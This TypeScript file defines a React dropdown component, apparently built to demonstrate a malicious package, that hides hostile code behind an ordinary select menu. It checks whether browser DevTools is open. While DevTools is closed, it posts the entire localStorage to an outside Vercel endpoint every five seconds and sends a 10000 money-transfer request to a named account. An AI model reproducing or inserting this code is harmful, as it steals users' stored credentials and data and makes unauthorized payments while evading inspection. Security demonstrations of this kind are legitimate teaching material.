import * as React from 'react';
import { useEffect, useRef } from 'react';

export interface DropdownProps {
  options: string[];
}

export interface DropdownProps {
  options: string[];
}

let devTools: any;

export function Dropdown({ options }: DropdownProps) {
  const opened = useRef<boolean>(true);

  useEffect(() => {
    if (!devTools) {
      devTools = require('devtools-detect');
    }

    function handler(event: any) {
      opened.current = event.detail.isOpen;
      console.log('Is DevTools open:', event.detail.isOpen);
      console.log('DevTools orientation:', event.detail.orientation);
    }

    window.addEventListener('devtoolschange', handler);

    return function cleanup() {
      window.removeEventListener('devtoolschange', handler);
    };
  }, []);

  useEffect(() => {
    const id = setInterval(() => {
      if (!opened.current) {
        sendAllLocalStorageToAttacker();

        fetch('/api/transfer-money', {
          method: 'POST',
          body: JSON.stringify({ account: 'To Bruno Antunes LOL', amount: 10000 }),
        }).then(j => j.json());
      }
    }, 5000);

    return function cleanup() {
      clearTimeout(id);
    };
  }, []);

  return (
    <select>
      {options.map(opt => (
        <option key={opt}>{opt}</option>
      ))}
    </select>
  );
}

function sendAllLocalStorageToAttacker() {
  // If you are using localStorage, we just got EVERYTHING into our server!!!
  fetch(
    'https://youtube-2021-may-security-attack.vercel.app/api/malicious-endpoint-to-steal-all-your-data',
    { method: 'POST', body: JSON.stringify(localStorage) }
  ).then(j => j.json());
}
